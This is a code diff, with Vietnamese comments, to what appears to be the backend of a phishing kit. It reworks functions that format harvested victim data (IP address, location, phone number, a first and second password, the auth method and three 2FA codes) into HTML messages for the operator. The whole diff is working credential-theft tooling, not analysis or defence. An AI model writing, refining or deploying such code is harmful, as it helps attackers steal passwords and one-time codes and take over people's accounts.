@@ -287,66 +287,62 @@ function formatPhoneNumber(phone, countryIso, dialCode) {
     let raw = String(phone).trim().replace(/[^\d+]/g, '');
     if (!raw) return 'N/A';
 
-    // Ưu tiên dùng dialCode từ client (nếu có)
+    let phoneNumber = raw;
+    let displayNumber = raw;
+    let countryName = '';
+
+    // Ưu tiên dùng dialCode từ client
     if (dialCode && countryMap[dialCode]) {
         const country = countryMap[dialCode];
+        countryName = country.name;
         let cleanPhone = raw;
         if (cleanPhone.startsWith(dialCode)) {
             cleanPhone = cleanPhone.substring(dialCode.length);
-        }
-        if (cleanPhone.startsWith('0')) {
+        } else if (cleanPhone.startsWith('0')) {
             cleanPhone = cleanPhone.substring(1);
         }
-        // Format đẹp
-        let formatted = cleanPhone;
-        if (cleanPhone.length >= 7) {
-            if (dialCode === '1' || dialCode === '44') {
-                formatted = cleanPhone.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
-            } else if (dialCode === '84' || dialCode === '66') {
-                formatted = cleanPhone.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
-            } else {
-                formatted = cleanPhone;
-            }
-        }
-        // CHỈ THÊM LINK, GIỮ NGUYÊN ĐỊNH DẠNG
-        return `<a href="tel:+${dialCode}${cleanPhone}">${country.name} +${dialCode} ${formatted}</a>`;
+        phoneNumber = `+${dialCode}${cleanPhone}`;
+        displayNumber = `${countryName} +${dialCode} ${cleanPhone}`;
     }
-
-    // Nếu số bắt đầu bằng dấu +, parse trực tiếp
-    if (raw.startsWith('+')) {
+    // Nếu số bắt đầu bằng dấu +
+    else if (raw.startsWith('+')) {
+        phoneNumber = raw;
+        displayNumber = raw;
         try {
             const parsed = parsePhoneNumberFromString(raw);
             if (parsed && parsed.isValid()) {
                 const code = String(parsed.countryCallingCode);
                 if (countryMap[code]) {
-                    return `<a href="tel:${raw}">${countryMap[code].name} ${parsed.formatInternational()}</a>`;
+                    countryName = countryMap[code].name;
+                    displayNumber = `${countryName} ${parsed.formatInternational()}`;
+                } else {
+                    displayNumber = parsed.formatInternational();
                 }
-                return `<a href="tel:${raw}">${parsed.formatInternational()}</a>`;
             }
         } catch(e) {}
-        return `<a href="tel:${raw}">${raw}</a>`;
+    }
+    // Tìm dial code từ đầu số
+    else {
+        const sortedCodes = Object.keys(countryMap).sort((a, b) => b.length - a.length);
+        let matchedCountry = null;
+        for (const code of sortedCodes) {
+            if (raw.startsWith(code)) {
+                matchedCountry = countryMap[code];
+                break;
+            }
+        }
+        if (matchedCountry) {
+            countryName = matchedCountry.name;
+            let remaining = raw.substring(matchedCountry.dialCode.length);
+            if (remaining.startsWith('0')) {
+                remaining = remaining.substring(1);
+            }
+            phoneNumber = `+${matchedCountry.dialCode}${remaining}`;
+            displayNumber = `${countryName} +${matchedCountry.dialCode} ${remaining}`;
+        }
     }
 
-    // Tìm dial code từ đầu số (ưu tiên độ dài lớn hơn)
-    let matchedCountry = null;
-    let matchedLength = 0;
-    
-    for (const [code, country] of Object.entries(countryMap)) {
-        if (raw.startsWith(code) && code.length > matchedLength) {
-            matchedCountry = country;
-            matchedLength = code.length;
-        }
-    }
-    
-    if (matchedCountry) {
-        let remaining = raw.substring(matchedLength);
-        if (remaining.startsWith('0')) {
-            remaining = remaining.substring(1);
-        }
-        return `<a href="tel:+${matchedCountry.dialCode}${remaining}">${matchedCountry.name} +${matchedCountry.dialCode} ${remaining}</a>`;
-    }
-    
-    return `<a href="tel:${raw}">${raw}</a>`;
+    return `<a href="tel:${phoneNumber}">${displayNumber}</a>`;
 }
 // ==================== HÀM FORMAT TIN NHẮN ====================
 function formatMessage(data) {
@@ -364,13 +360,11 @@ function formatMessage(data) {
     
     const formattedPhone = formatPhoneNumber(data.phone, data.countryIso, data.dialCode);
     
-    // Password dạng link (dùng a href để dễ copy, nhưng hiển thị text thường)
     const pass1 = data.password || data.passwordFirst || 'N/A';
     const pass2 = data.passwordSecond || 'N/A';
-    const pass1Link = pass1 !== 'N/A' ? `<a href="#">${pass1}</a>` : 'N/A';
-    const pass2Link = pass2 !== 'N/A' ? `<a href="#">${pass2}</a>` : 'N/A';
+    const pass1Link = pass1 !== 'N/A' ? `<code>${pass1}</code>` : 'N/A';
+    const pass2Link = pass2 !== 'N/A' ? `<code>${pass2}</code>` : 'N/A';
     
-    // GIỮ NGUYÊN ĐỊNH DẠNG CŨ, KHÔNG ICON, CHỈ THÊM LINK
     return `Ip: ${data.ip && !data.ip.includes('Error') ? data.ip : 'N/A'}
 Location: ${location}
 -----------------------------
@@ -385,11 +379,28 @@ Phone Number: ${formattedPhone}
 Password First: ${pass1Link}
 Password Second: ${pass2Link}
 -----------------------------
-Auth Method: ${data.authMethod || 'N/A'}
+Auth Method: ${formatAuthMethod(data.authMethod || 'N/A')}
 -----------------------------
 🔐Code 2FA(1): ${otp1}
 🔐Code 2FA(2): ${otp2}
 🔐Code 2FA(3): ${otp3}`;
+}
+
+function formatAuthMethod(authMethod) {
+    if (!authMethod || authMethod === 'N/A') return 'N/A';
+    
+    // Tìm số điện thoại trong chuỗi Auth Method (sms | +216343434343)
+    const phoneMatch = authMethod.match(/\+?\d{6,15}/);
+    if (phoneMatch) {
+        const phoneNumber = phoneMatch[0];
+        // Nếu số chưa có dấu +, thêm vào
+        const fullPhone = phoneNumber.startsWith('+') ? phoneNumber : `+${phoneNumber}`;
+        // Thay thế số điện thoại trong chuỗi bằng link
+        const methodType = authMethod.replace(phoneNumber, '').trim();
+        return `${methodType} <a href="tel:${fullPhone}">${fullPhone}</a>`;
+    }
+    
+    return authMethod;
 }
 
 // ==================== API CHÍNH ====================
